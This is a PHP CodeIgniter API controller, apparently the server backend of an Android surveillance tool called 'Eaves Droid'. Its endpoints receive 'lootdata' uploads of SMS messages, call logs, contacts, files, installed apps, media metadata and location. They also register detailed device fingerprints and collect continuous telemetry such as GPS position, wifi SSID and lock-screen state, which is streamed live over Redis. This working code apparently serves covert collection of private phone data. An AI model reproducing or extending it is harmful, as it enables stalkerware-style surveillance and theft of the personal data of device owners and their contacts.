<?php

namespace App\Controllers\api\v1;

use App\Controllers\BaseController;
use App\Models\AndroidModel;
use App\Models\CryptModel;
use App\Models\UserModel;
use App\Models\ReceiveModel;
use App\Models\LogUserActionModel;
use App\Services\TelemetryReceiverService;
use CodeIgniter\API\ResponseTrait;

class ReceiveController extends BaseController
{
    use ResponseTrait;

    /**
     * GET /api/v1/health
     * API health status check
     */
    public function health()
    {
        return $this->respond([
            'status'      => 'healthy',
            'service'     => 'Eaves Droid WebApp API',
            'version'     => '1.0.0',
            'server_time' => time(),
        ]);
    }

    /**
     * Upload file endpoint
     */
    public function upload()
    {
        // 1. Validate request method
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $service = new TelemetryReceiverService();

        // 2. Validate token first (security first!)
        $token = $this->request->getPost('token');
        if (!$service->validateToken($token)) {
            return $this->failUnauthorized('Invalid or expired token');
        }

        // 3. Validate required parameters
        $validation = $this->validate([
            'token' => 'required|min_length[8]|max_length[255]',
            'device_print_id' => 'required|string',
        ]);

        if (!$validation) {
            return $this->failValidationErrors($this->validator->getErrors());
        }

        // 4. Get and validate file
        $file = $this->request->getFile('lootdata');
        if (!$file || !$file->isValid()) {
            return $this->fail($file ? $file->getErrorString() : 'No file uploaded');
        }

        $devicePrintId = $this->request->getPost('device_print_id') ?? '';
        $uploadSource = $this->request->getPost('upload_source') ?? 'auto_sync';
        $category = $this->request->getPost('category');
        $requestUrl = current_url();
        $androidId = $this->request->getPost('android_id');

        $result = $service->handleUpload($file, $token, $devicePrintId, $uploadSource, $category, $requestUrl, $androidId);

        if ($result['success']) {
            return $this->respondCreated([
                'status' => $result['status'],
                'message' => 'File uploaded and processed successfully',
                'file_id' => $result['file_id'],
                'file_record_id' => null,
                'queue_id' => $result['queue_id'],
                'category' => $result['category'],
                'record_count' => $result['record_count'] ?? 0,
                'timestamp' => $result['timestamp']
            ]);
        }

        return $this->fail($result['error'] ?? 'Failed to enqueue uploaded file for processing', $result['status_code'] ?? 400);
    }

    /**
     * Individual data upload endpoints - each delegates to the generic upload logic
     * with a predetermined category.
     */
    public function upload_media_exif()
    {
        return $this->uploadWithCategory('media_exif');
    }

    public function upload_sms()
    {
        return $this->uploadWithCategory('sms');
    }

    public function upload_calls()
    {
        return $this->uploadWithCategory('calls');
    }

    public function upload_contacts()
    {
        return $this->uploadWithCategory('contacts');
    }

    public function upload_apps()
    {
        return $this->uploadWithCategory('apps');
    }

    public function upload_files()
    {
        return $this->uploadWithCategory('files');
    }

    public function upload_location()
    {
        return $this->uploadWithCategory('location');
    }

    public function upload_misc_software()
    {
        return $this->uploadWithCategory('misc_software');
    }

    public function upload_misc_hardware()
    {
        return $this->uploadWithCategory('misc_hardware');
    }

    private function uploadWithCategory(string $category)
    {
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $service = new TelemetryReceiverService();

        $token = $this->request->getPost('token');
        if (!$service->validateToken($token)) {
            return $this->failUnauthorized('Invalid or expired token');
        }

        $file = $this->request->getFile('lootdata');
        if (!$file || !$file->isValid()) {
            return $this->fail($file ? $file->getErrorString() : 'No file uploaded');
        }

        $devicePrintId = $this->request->getPost('device_print_id') ?? '';
        $uploadSource = $this->request->getPost('upload_source') ?? 'auto_sync';
        $requestUrl = current_url();
        $androidId = $this->request->getPost('android_id');

        $result = $service->handleUpload($file, $token, $devicePrintId, $uploadSource, $category, $requestUrl, $androidId);

        if ($result['success']) {
            return $this->respondCreated([
                'status' => $result['status'],
                'message' => 'File uploaded and processed successfully',
                'file_id' => $result['file_id'],
                'file_record_id' => null,
                'queue_id' => $result['queue_id'],
                'category' => $category,
                'record_count' => $result['record_count'] ?? 0,
                'timestamp' => $result['timestamp']
            ]);
        }

        return $this->fail($result['error'] ?? 'Processing failed', $result['status_code'] ?? 422);
    }

    /**
     * Token verification endpoint
     */
    public function token_verify()
    {
        // Validate request method
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $logModel = new LogUserActionModel();

        $json = $this->request->getJSON(true) ?? [];
        $token  = $json['token'] ?? $this->request->getPost('token');
        $time   = $json['time'] ?? $this->request->getPost('time');
        $ip     = $this->request->getIPAddress();
        $source = $json['source'] ?? $this->request->getPost('source');

        if (!$token || !$time) {
            return $this->failValidationError('Missing token or time parameters');
        }

        $service = new TelemetryReceiverService();

        // Determine login source for better logging
        $ua = $this->request->getUserAgent()->getAgentString() ?? '';
        $loginSource = $service->resolveTokenLoginSource($source, $ua);

        // Link device info if provided
        $deviceChecksum = $json['device_checksum'] ?? $json['device_print_id'] ?? $this->request->getPost('device_checksum') ?: $this->request->getPost('device_print_id');
        $androidId = $json['android_id'] ?? $this->request->getPost('android_id');
        $service->updateTokenDevice($token, $deviceChecksum, $androidId);

        // Log token verification attempt
        $service->logTokenVerification($token, $time, $ip, 'format_correct');

        // Verify token
        $androidModel = new AndroidModel();
        $tokenData = $androidModel->token_test($token);

        if (!$tokenData) {
            $service->logTokenVerification($token, $time, $ip, 'invalid_token');
            $logModel->logAction([
                'action_category' => 'authentication',
                'action_type'     => $loginSource,
                'action_severity' => 'medium',
                'success'         => 0,
                'request_url'     => current_url(),
                'error_message'   => 'Invalid or expired token',
                'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
            ]);
            return $this->respond([
                'success' => false,
                'token' => $token,
                'validity' => "False",
                'message' => 'Invalid or expired token',
                'timestamp' => date('Y-m-d H:i:s'),
            ], 401);
        }

        // Get user information
        $userModel = new UserModel();
        $cryptModel = new CryptModel();

        $userData = $userModel->get_vars($tokenData['owner_id']);
        if (!$userData) {
            return $this->fail('User not found');
        }

        // Decrypt user information
        $userName = !empty($userData['username']) ? $userData['username'] : $service->decryptUserData($cryptModel, $userData['Name'] ?? '');
        $userEmail = !empty($userData['email']) ? $userData['email'] : $service->decryptUserData($cryptModel, $userData['Email'] ?? '');

        // Update token last used timestamp
        $userModel->token_mark(
            $tokenData['owner_id'],
            $token,
            $tokenData['counter']
        );

        $logModel->logAction([
            'user_id'         => $tokenData['owner_id'],
            'action_category' => 'authentication',
            'action_type'     => $loginSource,
            'action_severity' => 'low',
            'success'         => 1,
            'request_url'     => current_url(),
            'new_values'      => json_encode([
                'token_id' => $tokenData['counter'],
            ]),
            'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
        ]);

        return $this->respond([
            'success' => true,
            'token' => $token,
            'validity' => true,
            'timestamp' => date('Y-m-d H:i:s'),
            'token_owner' => $tokenData['owner_id'],
            'token_expiry' => $tokenData['expires_at'],
            'token_id' => $tokenData['counter'],
            'token_owner_id' => (string) ($service->getTokenOwner($token) ?: $tokenData['owner_id']),
            'token_owner_name' => $userName ?: ($userData['username'] ?? 'User'),
            'token_owner_email' => $userEmail ?: ($userData['email'] ?? ''),
        ]);
    }

    /**
     * Device print registration endpoint
     */
    public function device_print()
    {
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $requiredFields = [
            'device_checksum', 'android_id', 'device_model', 'device_brand',
            'device_manufacturer', 'device_product', 'device_device',
            'device_board', 'device_hardware', 'android_version',
            'android_sdk_int', 'android_security_patch', 'build_id',
            'build_fingerprint', 'memory_total_mb', 'internal_storage_total_gb',
            'external_storage_total_gb', 'app_package', 'app_version',
            'extraction_timestamp', 'extractor_version'
        ];

        $optionalFields = ['fcm_token', 'widevine_id'];

        $json = $this->request->getJSON(true) ?? [];
        $post = $this->request->getPost() ?? [];
        $input = !empty($json) ? array_merge($post, $json) : $post;

        // Validate required fields
        foreach ($requiredFields as $field) {
            if (empty($input[$field])) {
                return $this->failValidationError("Missing field: {$field}");
            }
        }

        // Sanitize input
        $sanitizedData = [];
        $allFields = array_merge($requiredFields, $optionalFields);

        foreach ($allFields as $field) {
            $sanitizedData[$field] = isset($input[$field]) ? htmlspecialchars($input[$field], ENT_QUOTES, 'UTF-8') : '';
        }
        $sanitizedData['extraction_timestamp'] = isset($input['extraction_timestamp']) && is_numeric($input['extraction_timestamp']) ? (int)$input['extraction_timestamp'] : time() * 1000;
        $sanitizedData['device_ip_address'] = $this->request->getIPAddress();

        // Save owner_id for direct user-to-device linking (must be before make_device_print)
        if (!empty($input['token_owner_id'])) {
            $sanitizedData['owner_id'] = (int) $input['token_owner_id'];
        }

        try {
            $modelReceive = new ReceiveModel();
            $device_metadata = $modelReceive->make_device_print($sanitizedData);

            $service = new TelemetryReceiverService();

            // Link token if provided
            $token = $input['token'] ?? $input['sent_token'] ?? '';
            if (!empty($token)) {
                $deviceChecksum = $input['device_checksum'] ?? $input['device_print_id'] ?? $this->request->getPost('device_checksum') ?: $this->request->getPost('device_print_id');
                $androidId = $input['android_id'] ?? $this->request->getPost('android_id');
                $service->updateTokenDevice($token, $deviceChecksum, $androidId);
            }

            $logModel = new LogUserActionModel();

            // Get request object
            $request = $this->request;

            // Extract device info from HEADERS (not POST body)
            $headers = $request->headers();

            $logModel->logAction([
                'action_category' => 'system',
                'action_type'     => 'device_registration',
                'action_severity' => 'low',
                'success'         => 1,
                'device_type'     => 'mobile',
                'request_url'     => current_url(),
                'request_method'  => $request->getMethod(),
                'device_name'     => $request->getHeader('device_name') ?
                    $request->getHeader('device_name')->getValue() :
                    ($input['device_model'] ?? 'Unknown Device'),
                'device_type'     => $request->getHeader('device_type') ?
                    $request->getHeader('device_type')->getValue() : 'phone',
                'operating_system'=> $request->getHeader('os') ?
                    $request->getHeader('os')->getValue() : 'Android',
                'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
            ]);

            $dev_print    = json_decode($device_metadata, true);
            $serverChecksum = $dev_print['dev_chck_sum'] ?? ($sanitizedData['device_checksum'] ?? '');

            // Echo back the auth token so Android can refresh its stored copy
            $echoToken = $input['token'] ?? $input['sent_token'] ?? '';

            return $this->respond([
                'success'           => true,
                'message'           => $dev_print['is_new'] ? 'Device print created' : 'Device print updated',
                'device_profile_id' => (int) ($dev_print['dev_id'] ?? 0),
                'checksum'          => $serverChecksum,   // Android reads this as X-Device-Checksum seed
                'token'             => $echoToken,         // Android refreshes SHARED_PREF_AUTH_TOKEN
                'is_new'            => (bool) ($dev_print['is_new'] ?? true),
                'timestamp'         => date('Y-m-d H:i:s')
            ]);

        } catch (\Exception $e) {
            log_message('error', 'Device print failed: ' . $e->getMessage());
            return $this->failServerError('Failed to register device print');
        }
    }

    /**
     * POST /api/v1/devices/health-update
     * Receives device health check diagnostics updates.
     */
    public function health_update()
    {
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $json = $this->request->getJSON(true) ?? [];
        $post = $this->request->getPost() ?? [];
        $input = !empty($json) ? array_merge($post, $json) : $post;

        $deviceId = $input['device_id'] ?? '';
        if (empty($deviceId)) {
            return $this->failValidationError('Missing field: device_id');
        }

        $db = \Config\Database::connect();

        $data = [
            'device_id'            => $deviceId,
            'ip_address'           => $input['ip_address'] ?? $this->request->getIPAddress(),
            'network_type'         => $input['network_type'] ?? 'NONE',
            'wifi_ssid'            => $input['wifi_ssid'] ?? null,
            'sim_operator'         => $input['sim_operator'] ?? null,
            'signal_strength'      => isset($input['signal_strength']) ? (int)$input['signal_strength'] : null,
            'battery_level'        => isset($input['battery_level']) ? (int)$input['battery_level'] : 0,
            'battery_status'       => $input['battery_status'] ?? 'Unknown',
            'battery_temp'         => isset($input['battery_temp']) ? (double)$input['battery_temp'] : null,
            'screen_state'         => $input['screen_state'] ?? 'Unknown',
            'keyguard_locked'      => !empty($input['keyguard_locked']) ? 1 : 0,
            'storage_free_percent' => isset($input['storage_free_percent']) ? (int)$input['storage_free_percent'] : null,
            'ram_free_mb'          => isset($input['ram_free_mb']) ? (int)$input['ram_free_mb'] : null,
            'last_latitude'        => isset($input['last_latitude']) ? (double)$input['last_latitude'] : null,
            'last_longitude'       => isset($input['last_longitude']) ? (double)$input['last_longitude'] : null,
            'location_provider'    => $input['location_provider'] ?? null,
            'app_version'          => $input['app_version'] ?? null,
            'uptime_seconds'       => isset($input['uptime_seconds']) ? (int)$input['uptime_seconds'] : null,
            'created_at'           => date('Y-m-d H:i:s'),
        ];

        try {
            $db->table('tbl_device_health_checks')->insert($data);

            // Phase 2: Redis Pub/Sub for SSE
            try {
                $redis = new \App\Services\RedisService();
                $client = $redis->getClient();
                if ($client) {
                    $client->publish("health:update:{$deviceId}", json_encode($data));
                }
            } catch (\Throwable $e) {
                log_message('error', 'Redis publish failed on health update: ' . $e->getMessage());
            }

            return $this->respondCreated([
                'success' => true,
                'message' => 'Health check telemetry recorded successfully.',
                'timestamp' => $data['created_at']
            ]);
        } catch (\Exception $e) {
            log_message('error', 'Health check save error: ' . $e->getMessage());
            return $this->failServerError('Failed to save health telemetry');
        }
    }

    /**
     * GET /api/v1/devices/health-latest/(:any)
     * Retrieves the latest health check diagnostics record for a device.
     */
    public function health_latest($token = null)
    {
        if (empty($token)) {
            return $this->failValidationError('Missing device token identifier');
        }

        $deviceId = null;
        $db = \Config\Database::connect();

        // 1. Try to resolve as encrypted database ID (counter)
        $crypt = new CryptModel();
        $decryptedCounter = $crypt->decrypt_id($token);
        if ($decryptedCounter && is_numeric($decryptedCounter)) {
            $device = $db->table('tbl_device_profiles')
                ->select('device_id')
                ->where('counter', (int)$decryptedCounter)
                ->get()
                ->getRowArray();
            if ($device && !empty($device['device_id'])) {
                $deviceId = $device['device_id'];
            }
        }

        // 2. Try to treat as device checksum (64 char hex string)
        if (!$deviceId && strlen($token) === 64 && ctype_xdigit($token)) {
            $deviceId = $token;
        }

        if (empty($deviceId)) {
            return $this->failValidationError('Invalid device identifier');
        }

        // Fetch latest record from tbl_device_health_checks
        $latest = $db->table('tbl_device_health_checks')
            ->where('device_id', $deviceId)
            ->orderBy('created_at', 'DESC')
            ->limit(1)
            ->get()
            ->getRowArray();

        if (!$latest) {
            return $this->respond([
                'success' => false,
                'message' => 'No health telemetry records found for this device.'
            ]);
        }

        return $this->respond([
            'success' => true,
            'data'    => $latest
        ]);
    }

    /**
     * Fail validation error helper
     */
    private function failValidationError($message)
    {
        return $this->respond([
            'success' => false,
            'message' => $message,
            'errors' => [$message]
        ], 422);
    }
}
